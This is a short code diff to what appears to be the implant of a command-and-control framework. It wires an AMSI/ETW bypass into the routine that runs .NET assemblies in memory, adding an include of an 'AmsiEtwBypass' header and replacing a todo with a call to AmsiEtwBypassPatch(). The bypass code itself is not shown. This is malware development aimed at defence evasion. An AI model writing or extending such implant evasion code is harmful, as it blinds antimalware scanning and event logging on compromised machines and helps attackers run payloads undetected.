@@ -4,6 +4,7 @@
 #include <core/Dotnet.h>
 #include <core/HwBpExceptions.h>
 #include <core/Runtime.h>
+#include <core/AmsiEtwBypass.h>
 
 #define PIPE_BUFFER 0x10000 * 5
 
@@ -128,7 +129,12 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
 #endif
     }
     else if ( Instance->Config.Implant.AmsiEtwPatch == AMSIETW_PATCH_MEMORY ) {
-        /* todo: add memory patching technique */
+        /* ARC-01: process-wide in-memory bypass was already applied at
+         * DemonInit time, so this is a no-op.  Call AmsiEtwBypassPatch()
+         * again to ensure idempotent re-entry is safe (e.g. if dotnet is
+         * invoked before DemonInit had a chance to complete on an unusual
+         * path). */
+        AmsiEtwBypassPatch();
     }
     else {
         /* no patching */
